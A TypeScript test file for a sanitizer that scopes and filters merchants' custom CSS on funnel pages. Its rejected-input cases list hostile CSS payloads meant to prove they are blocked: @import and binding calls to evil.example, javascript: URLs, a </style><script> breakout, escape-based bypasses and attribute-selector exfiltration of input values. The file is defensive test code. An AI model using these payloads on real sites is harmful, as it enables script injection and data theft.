import { describe, expect, it } from "vitest";
import { compileFunnelCustomCss, FUNNEL_CUSTOM_CSS_SCOPE } from "./funnel-custom-css";

const S = FUNNEL_CUSTOM_CSS_SCOPE;

function css(source: string) {
  const result = compileFunnelCustomCss(source);
  if (!result.ok) throw new Error(`expected CSS to compile: ${result.error}`);
  return result.css;
}

function rejected(source: string) {
  const result = compileFunnelCustomCss(source);
  expect(result.ok, source).toBe(false);
  return result.ok ? "" : result.error;
}

describe("compileFunnelCustomCss: scoping", () => {
  it("prefixes every selector of a list with the page content container", () => {
    expect(css(".hero h1, .cta>a{color:#f00}")).toBe(`${S} .hero h1,${S} .cta > a{color:#f00}`);
    expect(css("* {display:none}")).toBe(`${S} *{display:none}`);
    expect(css("a:hover::after{content:\"→\"}")).toBe(`${S} a:hover::after{content:"→"}`);
  });

  it("rewrites html, body and :root to the container itself", () => {
    expect(css("body{display:none}")).toBe(`${S}{display:none}`);
    expect(css("html body .x{color:red}")).toBe(`${S} .x{color:red}`);
    expect(css(":root{--brand:#123456}")).toBe(`${S}{--brand:#123456}`);
    expect(css("body.dark > p{color:white}")).toBe(`${S}.dark > p{color:white}`);
    expect(css("HTML{font-size:18px}")).toBe(`${S}{font-size:18px}`);
  });

  it("scopes rules inside @media and @supports, including nested at-rules", () => {
    expect(css("@media (max-width: 600px){.a{margin:0} @supports (display: grid){body{display:grid}}}"))
      .toBe(`@media (max-width: 600px){${S} .a{margin:0}\n@supports (display: grid){${S}{display:grid}}}`);
  });

  it("allows https @font-face and prefixes @keyframes names, including their animation references", () => {
    const compiled = css("@font-face{font-family:\"Brand\";src:url(https://cdn.example.com/brand.woff2) format(\"woff2\")} @keyframes pulse{from{opacity:0}50%{opacity:.5}to{opacity:1}} .x{animation:pulse 1s infinite;animation-name:pulse}");
    expect(compiled).toContain("@font-face{font-family:\"cdm-Brand\";src:url(https://cdn.example.com/brand.woff2) format(\"woff2\")}");
    expect(compiled).toContain("@keyframes cdm-pulse{from{opacity:0}50%{opacity:.5}to{opacity:1}}");
    expect(compiled).toContain(`${S} .x{animation:cdm-pulse 1s infinite;animation-name:cdm-pulse}`);
  });

  it("keeps https url() values and strips comments", () => {
    expect(css("/* hero */ .hero{background:url('https://img.example.com/a.png') center/cover}")).toBe(`${S} .hero{background:url('https://img.example.com/a.png') center/cover}`);
  });

  it("accepts blank input as no CSS", () => {
    expect(compileFunnelCustomCss("   ")).toEqual({ ok: true, css: "" });
  });

  it("keeps fixed overlays scoped: the output never targets anything outside the container", () => {
    const compiled = css(".x{position:fixed;inset:0;z-index:2147483647;background:#fff}");
    expect(compiled).toBe(`${S} .x{position:fixed;inset:0;z-index:2147483647;background:#fff}`);
    for (const line of compiled.split("\n")) expect(line.startsWith(S)).toBe(true);
  });
});

describe("compileFunnelCustomCss: rejected syntax", () => {
  it.each([
    ["@import", "@import url(https://evil.example/x.css); .a{color:red}", "@import"],
    ["@namespace", "@namespace svg url(https://www.w3.org/2000/svg);", "@namespace"],
    ["@charset", "@charset \"utf-8\"; .a{color:red}", "@charset"],
    ["@layer", "@layer base{.a{color:red}}", "@layer"],
    ["@property", "@property --x{syntax:'<length>'}", "<"],
    ["@page", "@page{margin:0}", "@page"],
    ["data: url", ".a{background:url(data:image/png;base64,AAAA)}", "https://"],
    ["javascript: url", ".a{background:url(javascript:alert(1))}", "javascript:"],
    ["relative url", ".a{background:url(/admin/secret.png)}", "https://"],
    ["protocol-relative url", ".a{background:url(//evil.example/x.png)}", "https://"],
    ["http url", ".a{background:url(http://evil.example/x.png)}", "https://"],
    ["expression()", ".a{width:expression(alert(1))}", "expression"],
    ["behavior", ".a{behavior:url(https://evil.example/x.htc)}", "behavior"],
    ["-moz-binding", ".a{-moz-binding:url(https://evil.example/x.xml#x)}", "-moz-binding"],
    ["image-set strings", ".a{background-image:image-set(\"/x.png\" 1x)}", "image-set"],
    ["</style breakout", ".a{color:red}</style><script>alert(1)</script>", "<"],
    ["less-than anywhere", ".a{content:\"<\"}", "<"],
    ["backslash escape", ".a{background:u\\72l(javascript:alert(1))}", "反斜線"],
    ["escaped import", "@\\69mport url(https://evil.example/x.css);", "反斜線"],
    ["[value] exfiltration", "input[value^=\"a\"]{background:url(https://evil.example/a)}", "[value]"],
    ["[value] inside :has", "form:has(input[value$=\"z\"]){color:red}", "[value]"],
    ["[nonce]", "script[nonce^=\"a\"]{display:block}", "[nonce]"],
    ["sibling of the container", "body ~ aside{display:none}", "相鄰"],
    ["adjacent sibling of the container", "body + aside{display:none}", "相鄰"],
    ["root keyword not at the start", ".a body{color:red}", "開頭"],
    ["leading combinator", "> .a{color:red}", "組合子"],
    ["nested rules", ".a{color:red; .b{color:blue}}", "巢狀"],
    ["unbalanced braces", ".a{color:red", "}"],
    ["stray closing brace", "}.a{color:red}", "}"],
    ["unterminated comment", ".a{color:red} /* x", "註解"],
    ["generic @font-face family", "@font-face{font-family:system-ui;src:url(https://cdn.example.com/blank.woff2)}", "通用字型"],
    ["@font-face without https", "@font-face{font-family:Brand;src:url(/fonts/x.woff2)}", "https://"],
    ["non-ascii control characters", ".a{color:red}\u0001", "控制字元"],
    ["unsupported selector characters", ".a & .b{color:red}", "字元"],
  ])("%s", (_name, source, message) => {
    expect(rejected(source)).toContain(message);
  });

  it("rejects input over 20 KB", () => {
    expect(rejected(`.a{color:red}${" ".repeat(20_001)}`)).toContain("20 KB");
  });

  it("rejects a non-string value", () => {
    expect(compileFunnelCustomCss(42).ok).toBe(false);
  });
});

describe("compileFunnelCustomCss: merchant fonts cannot take over platform font stacks", () => {
  it("prefixes @font-face family names and rewrites only matching font-family and font references", () => {
    const compiled = css([
      "@font-face{font-family:'Noto Sans TC';src:url(https://cdn.example.com/blank.woff2)}",
      "@font-face{font-family:Brand Serif;src:url(https://cdn.example.com/brand.woff2)}",
      "h1{font-family:\"Noto Sans TC\", 'Segoe UI', sans-serif}",
      ".lead{font:italic 700 18px/1.4 Brand Serif, serif}",
      ".quote{font:16px 'brand serif'}",
      "p{font-family:Segoe UI, system-ui}",
    ].join("\n"));
    expect(compiled).toContain('@font-face{font-family:"cdm-Noto Sans TC";src:url(https://cdn.example.com/blank.woff2)}');
    expect(compiled).toContain('@font-face{font-family:"cdm-Brand Serif";src:url(https://cdn.example.com/brand.woff2)}');
    expect(compiled).toContain(`${S} h1{font-family:"cdm-Noto Sans TC",'Segoe UI',sans-serif}`);
    expect(compiled).toContain(`${S} .lead{font:italic 700 18px/1.4 "cdm-Brand Serif", serif}`);
    expect(compiled).toContain(`${S} .quote{font:16px "cdm-Brand Serif"}`);
    // Names the merchant did not declare (and generic families) are left alone.
    expect(compiled).toContain(`${S} p{font-family:Segoe UI, system-ui}`);
    // No @font-face rule can define an unprefixed family name.
    for (const match of compiled.matchAll(/@font-face\{font-family:([^;]+);/gu)) expect(match[1]).toMatch(/^"cdm-/u);
  });

  it("rejects font names with characters outside letters, digits, spaces, _ and -", () => {
    expect(rejected("@font-face{font-family:'Brand;x';src:url(https://cdn.example.com/a.woff2)}")).not.toBe("");
    expect(rejected("@font-face{font-family:'a(b)';src:url(https://cdn.example.com/a.woff2)}")).toContain("字型名稱");
  });
});
